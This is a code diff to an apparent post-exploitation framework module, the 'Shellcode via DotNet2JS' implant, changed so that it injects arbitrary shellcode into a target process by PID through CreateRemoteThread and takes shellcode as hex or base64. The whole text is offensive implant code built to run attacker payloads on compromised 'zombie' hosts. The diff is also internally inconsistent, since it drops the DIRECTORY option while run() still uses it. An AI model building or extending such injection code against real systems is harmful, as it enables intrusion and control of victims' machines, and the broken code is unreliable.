@@ -33,21 +33,21 @@ class SDotNet2JSJob(core.job.Job):
 class SDotNet2JSImplant(core.implant.Implant):
 
     NAME = "Shellcode via DotNet2JS"
-    DESCRIPTION = "Executes arbitrary shellcode using the DotNet2JS technique"
-    AUTHORS = ["zerosum0x0", "TheNaterz", "tiraniddo"]
+    DESCRIPTION = "Executes arbitrary shellcode using the DotNet2JS technique. Inject shellcode into a host process via createremotethread as a new thread."
+    AUTHORS = ["zerosum0x0", "TheNaterz", "tiraniddo", "psmitty"]
     STATE = "implant/inject/shellcode_dotnet2js"
 
     def load(self):
-        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)
         self.options.register("DLLCOMMANDS", "", "string to pass to dll if needed", required=False)
-        self.options.register("DLLHEX", "", "relative path to dll hex or paste hex string", required=True)
-        self.options.register("DLLB64", "", "calculated bytes for arr_DLL", advanced=True)
-        self.options.register("DLLOFFSET", "0", "Offset to the reflective loader", advanced = True)
+        self.options.register("SC_HEX", "", "relative path to shellcode/dll hex or paste hex string", required=True)
+        self.options.register("SC_B64", "", "shellcode in base64", advanced=True)
+        self.options.register("DLLOFFSET", "0", "Offset to the reflective loader", advanced=True)
+        self.options.register("PID", "0", "process ID to inject into (0 = current process)", required=True)
 
     def job(self):
         return SDotNet2JSJob
 
-    def dllb64(self, path):
+    def scb64(self, path):
         import base64
         import os.path
         import binascii
@@ -66,12 +66,12 @@ class SDotNet2JSImplant(core.implant.Implant):
             if index % 100 == 0:
                 ret += '"+\r\n"'
 
-        ret += '";'
+        ret += '"'
         return ret
 
     def run(self):
 
-        self.options.set("DLLB64", self.dllb64(self.options.get("DLLHEX")))
+        self.options.set("SC_B64", self.scb64(self.options.get("SC_HEX")))
         self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
 
         workloads = {}
